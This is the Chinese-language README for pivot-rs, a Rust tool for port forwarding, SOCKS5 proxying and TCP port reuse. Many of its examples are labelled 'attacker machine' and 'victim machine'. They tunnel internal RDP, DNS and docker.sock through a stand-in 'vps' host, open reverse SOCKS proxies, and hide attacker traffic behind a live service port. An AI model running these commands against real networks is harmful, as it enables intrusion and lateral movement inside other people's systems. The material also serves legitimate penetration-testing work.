# pivot-rs

[English](README.md) | [简体中文](README.zh.md)

`pivot-rs` 是一个轻量级的端口转发和 Socks 代理工具, 使用 Rust 编写 🦀

## 构建

项目目前仅发布如下架构的二进制文件 (基于 GitHub Actions):

- x86_64-unknown-linux-gnu
- x86_64-apple-darwin
- aarch64-apple-darwin
- x86_64-pc-windows-msvc

*其中 `x86_64-unknown-linux-gnu` 和 `x86_64-pc-windows-msvc` 会另外附加一份 UPX 压缩过后的二进制文件*

如果你需要的架构不在上面的列表中, 你可以自行构建.

```bash
git clone https://github.com/X1r0z/pivot-rs
cd pivot-rs
cargo build --release
```

## 特性

- TCP/UDP 端口转发
- Unix domain socket 转发 (例如 `/var/run/docker.sock`)
- Socks5 代理 (支持身份验证)
- TCP 端口复用 (使用 `SO_REUSEADDR` 和 `SO_REUSEPORT`)
- 支持多层代理
- 支持 TLS 加密

## 用法

`pivot-rs` 有三种模式: 端口转发, Socks 代理, 端口复用, 分别对应 `fwd`, `proxy`, `reuse` 参数.

```bash
$ ./pivot -h

Pivot: Port-Forwarding and Proxy Tool

Usage: pivot <COMMAND>

Commands:
  fwd    Port forwarding mode
  proxy  Socks proxy mode
  reuse  Port reuse mode
  help   Print this message or the help of the given subcommand(s)

Options:
  -h, --help     Print help
  -V, --version  Print version
```

端口转发模式

```bash
$ ./pivot fwd -h

Port forwarding mode

Usage: pivot fwd [OPTIONS]

Options:
  -l, --locals <LOCALS>            Local listen IP address, format: [+][IP:]PORT
  -r, --remotes <REMOTES>          Remote connect IP address, format: [+]IP:PORT
  -s, --socket <SOCKET>            Unix domain socket path
  -p, --protocol <PROTOCOL>        Forward Protocol [default: tcp] [possible values: tcp, udp]
  -c, --connections <CONNECTIONS>  Maximum connections [default: 32]
  -h, --help                       Print help (see more with '--help')
```

Socks 代理模式

```bash
$ ./pivot proxy -h

Socks proxy mode

Usage: pivot proxy [OPTIONS]

Options:
  -l, --locals <LOCALS>            Local listen IP address, format: [+][IP:]PORT
  -r, --remote <REMOTE>            Reverse server IP address, format: [+]IP:PORT
  -a, --auth <AUTH>                Authentication info, format: user:pass (other for random)
  -c, --connections <CONNECTIONS>  Maximum connections [default: 32]
  -h, --help                       Print help
```

端口复用模式

```bash
$ ./pivot reuse -h

Port reuse mode

Usage: pivot reuse [OPTIONS] --local <LOCAL> --remote <REMOTE> --external <EXTERNAL>

Options:
  -l, --local <LOCAL>        Local reuse IP address, format: IP:PORT
  -r, --remote <REMOTE>      Remote redirect IP address, format: IP:PORT
  -f, --fallback <FALLBACK>  Fallback IP address, format: IP:PORT
  -e, --external <EXTERNAL>  External IP address, format: IP
  -t, --timeout <TIMEOUT>    Timeout to stop port reuse
  -h, --help                 Print help
```

### TCP 端口转发

监听 `0.0.0.0:8888` 和 `0.0.0.0:9999`, 在两者之间转发流量.

*指定 `127.0.0.1:PORT` 以监听本地地址*

```bash
./pivot fwd -l 8888 -l 9999
```

监听 `0.0.0.0:8888`, 将流量转发到一个远程地址.

```bash
./pivot fwd -l 8888 -r 10.0.0.1:9999
```

连接 `10.0.0.1:8888` 和 `10.0.0.2:9999`, 在两者之间转发流量.

```bash
./pivot fwd -r 10.0.0.1:8888 -r 10.0.0.1:9999
```

在这种模式下, 指定 `-c` 可以设置最大 TCP 连接数 (默认为 32)

一个简单的内网端口转发的示例.

```bash
# 攻击者机器
./pivot fwd -l 8888 -l 9999

# 受害者机器
./pivot fwd -r 10.0.0.1:3389 -r vps:8888

# 攻击者现在可以通过 vps:9999 访问 10.0.0.1:3389
```

一个复杂的示例, 在内网中进行多层转发.

```bash
# A 机器 (10.0.0.1, 172.16.0.1)
./pivot fwd -r 10.0.0.10:3389 -l 7777

# B 机器 (172.16.0.2, 192.168.1.1)
./pivot fwd -r 172.16.0.1:7777 -r 192.168.1.2:8888

# C 机器 (192.168.1.2, DMZ)
./pivot fwd -l 8888 -r vps:9999

# 攻击者机器
./pivot fwd -l 9999 -l 33890

# 攻击者现在可以通过 vps:33890 访问 10.0.0.10:3389
```

注意 B 机器上的命令必须最后执行, 因为这种模式会检查两个远程地址的连通性.

### UDP 端口转发

UDP 的端口转发与 TCP 类似, 只需要添加 `-p udp` 参数.

**目前该功能还在实验性阶段, 可能不太稳定.**

注意在**反向** UDP 端口转发时, 会通过发送 handshake 握手包的形式来记住客户端地址.

示例:

```bash
# 攻击者机器
./pivot fwd -l 8888 -l 9999 -p udp

# 受害者机器
./pivot fwd -r 10.0.0.1:53 -r vps:8888 -p udp
```

受害者机器会向 `vps:8888` (即攻击者机器) 发送一个 4 字节的握手包 (内容全为 0).

攻击者机器会通过这个数据包记住客户端地址, 这样当用户连接到 `vps:9999` 时, 就会将流量转发到这个地址.

**因为握手包的存在, 所有参数必须按顺序传递, 不能交换位置.**

另一个示例:

```bash
# A 机器 (10.0.0.1, 192.168.1.1, intranet)
./pivot fwd -r 10.0.0.10:53 -l 7777 -p udp

# B 机器 (192.168.1.2, DMZ)
./pivot fwd -r 192.168.1.1:7777 -r vps:8888 -p udp # 这句命令需要在最后执行

# 攻击者机器
./pivot fwd -l 8888 -l 9999 -p udp
```

握手包将从 B 机器发送到攻击者机器 (8888 端口). 用户可以通过端口 9999 连接到内网.

### Unix domain socket 转发

*该特性仅支持 Linux 和 macOS*

Unix domain socket 是一种 IPC (Inter-Process Communication, 进程间通信) 手段, 允许运行在同一台机器上的不同进程之间进行数据交换.

常见的 Unix domain socket 有 `/var/run/docker.sock` 和 `/var/run/php-fpm.sock`.

你可以将 Unix domain socket 转发到一个 TCP 端口.

```bash
./pivot fwd -s /var/run/docker.sock -l 4444

# 获取 Docker 版本
curl http://127.0.0.1:4444/version
```

或者进行反向端口转发.

```bash
# 受害者机器
./pivot fwd -s /var/run/docker.sock -r vps:4444

# 攻击者机器
./pivot fwd -l 4444 -l 5555

# 获取 Docker 版本
curl http://vps:5555/version
```

### Socks 代理

`pivot-rs` 支持 Socks5 协议的代理, 并且支持配置身份验证

正向 Socks 代理

```bash
./pivot proxy -l 1080
```

反向 Socks 代理

```bash
# 攻击者机器
./pivot proxy -l 7777 -l 8888
# 第一个 -l 指定控制端口 (Control Port)
# 第二个 -l 指定代理端口 (Proxy Port)

# 受害者机器
./pivot proxy -r vps:7777

# 现在攻击者可以在 vps:8888 上使用 Socks 代理
```

上述示例中的 7777 端口被称为控制端口 (Control Port), 该端口使用 TCP 多路复用技术以确保在单个 TCP 长连接内处理多个 TCP 流 (即处理多个 Socks 代理请求)

因此, 7777 和 8888 端口的顺序**不能颠倒**

另外, 在这种场景下, 受害者机器可以指定 `-c` 参数以设置最大连接数 (默认为 32)

*这里的最大连接数指的是在 TCP 多路复用场景下同时处理的最大 Stream 数*

如果需要开启身份验证, 只需要在 `-a` 参数后添加 `user:pass`

```bash
./pivot proxy -l 1080 -a user:pass
```

如果你向 `-a` 参数传递的字符串不符合 `user:pass` 的格式, `pivot-rs` 则会生成一个随机的用户名和密码.

```bash
./pivot proxy -l 1080 -a rand

# 生成的随机用户名和密码会输出在终端上
```

`pivot-rs` 支持将无身份验证的 Socks 请求转发至带有身份验证的 Socks 代理

*目前 Chrome, Edge 和 FireFox 浏览器均不支持带有身份验证的 Socks 代理, 因此可以使用这种方式绕过限制, 同时确保 Socks 代理的安全性.*

```bash
# vps:1080 需要身份验证 (user:pass)

# 监听 1080 端口, 将 Socks 请求转发至 vps:1080 并进行身份验证
./pivot proxy -l 1080 -r vps:1080 -a user:pass

# 现在浏览器可以使用 127.0.0.1:1080 作为 Socks 代理 (无需身份验证)
# 身份验证信息会被自动转发
```

### TLS 加密

TLS 加密支持 TCP 端口转发, Unix domain socket 转发和 Socks 代理.

要启用加密, 只需要在地址或端口前加上 `+` 符号.

为了方便使用, 服务端会生成一个自签名的证书, 客户端会信任所有证书 (不验证证书和连接地址是否匹配).

一个 TCP 端口转发启用 TLS 加密的示例.

```bash
# 攻击者机器
./pivot fwd -l +7777 -l 33890

# 受害者机器
./pivot fwd -r 127.0.0.1:3389 -r +vps:7777

# 现在攻击者可以通过 vps:33890 访问受害者的 3389 端口, 在 7777 端口上的流量会被加密
```

一个反向 Socks 代理启用 TLS 加密的示例.

```bash
# 攻击者机器
./pivot proxy -l +7777 -l 8888

# 受害者机器
./pivot proxy -r +vps:7777

# 现在攻击者可以在 vps:8888 上使用 Socks 代理, 在 7777 端口上的流量会被加密
```

### TCP 端口复用

`pivot-rs` 支持使用 `SO_REUSEADDR` 和 `SO_REUSEPORT` 选项进行 TCP 端口复用.

端口复用的行为因操作系统而异.

在 Windows 中, 只有 `SO_REUSEADDR` 选项, 允许多个 socket 绑定到同一个地址和端口. 但也有一些限制, 取决于执行端口复用的帐户以及绑定的 IP 地址, 具体可参考如下链接.

[https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse](https://learn.microsoft.com/en-us/windows/win32/winsock/using-so-reuseaddr-and-so-exclusiveaddruse)

Linux 通过 `SO_REUSEADDR` 和 `SO_REUSEPORT` 两个选项实现端口复用, 原理是绑定不同的 IP 地址.

|  复用地址/监听地址   | 0.0.0.0 | 192.168.1.1 | 10.0.0.1 |
| :---------------: | :-----: | :---------: | :------: |
|    **0.0.0.0**    |    x    |      x      |    x     |
|  **192.168.1.1**  |    x    |      x      |    √     |
|   **10.0.0.1**    |    x    |      √      |    x     |

`0.0.0.0` 与其它任何地址互斥, 即某个程序如果监听了 `0.0.0.0:80` 地址, 那么就无法对 80 端口进行复用 (反之亦然).

另外存在一种场景可以实现 IP 地址完全相同的端口复用, 即某个程序本身就设置了 `SO_REUSEPORT` 选项, 并且执行该程序的用户的 uid 与执行端口复用的用户的 uid 相同.

macOS 的端口复用逻辑与 Linux 类似, 但不同的点在于 `0.0.0.0` 没有了互斥性. 即使某个程序已经绑定到了 `0.0.0.0`, 那么其它程序仍然可以绑定到某个特定的 IP 地址 (反之亦然).

|  复用地址/监听地址   | 0.0.0.0 | 192.168.1.1 | 10.0.0.1 |
| :---------------: | :-----: | :---------: | :------: |
|    **0.0.0.0**    |    x    |      √      |    √     |
|  **192.168.1.1**  |    √    |      x      |    √     |
|   **10.0.0.1**    |    √    |      √      |    x     |

要复用端口, 需要指定下面四个地址参数:

`-l` 指定被复用的本地地址

`-r` 指定连接到复用地址后重定向的远程地址

`-f` 指定一个 fallback 地址, 当来源与 external 地址不匹配时就会连接到该地址 (例如普通用户的连接请求)

`-e` 指定一个 external 地址, 即攻击者的公网 IP, 仅此地址会走端口复用的流程

例如, 端口复用 8000 端口

```bash
./pivot reuse -l 192.168.1.1:8000 -r 10.0.0.1:22 -f 127.0.0.1:8000 -e 1.2.3.4
```

公网 IP 为 `1.2.3.4` 的攻击者会通过 `192.168.1.1:8000` 连接到 `10.0.0.1:22`, 正常用户则会 fallback 到 `127.0.0.1:8000` (防止影响 8000 端口上的正常业务)

注意不建议复用 `0.0.0.0` 地址上的端口, 因为这会导致 fallback 地址失效 (fallback 连接依然会走端口复用流程, 一直循环, 最终 crash).

有时候你可以不用指定 fallback 地址, 而是设置一个 timeout

```bash
./pivot reuse -l 192.168.1.1:8000 -r 10.0.0.1:22 -e 1.2.3.4 -t 10
```

这里的 timeout 代表在特定时间 (10s) 后停止端口复用, 但是已有的活动连接会被继续转发.

## 参考

[https://github.com/EddieIvan01/iox](https://github.com/EddieIvan01/iox)

[https://github.com/p1d3er/port_reuse](https://github.com/p1d3er/port_reuse)

[https://ph4ntonn.github.io/port-reuse](https://ph4ntonn.github.io/Port-reuse)

[https://saucer-man.com/operation_and_maintenance/586.html](https://saucer-man.com/operation_and_maintenance/586.html)
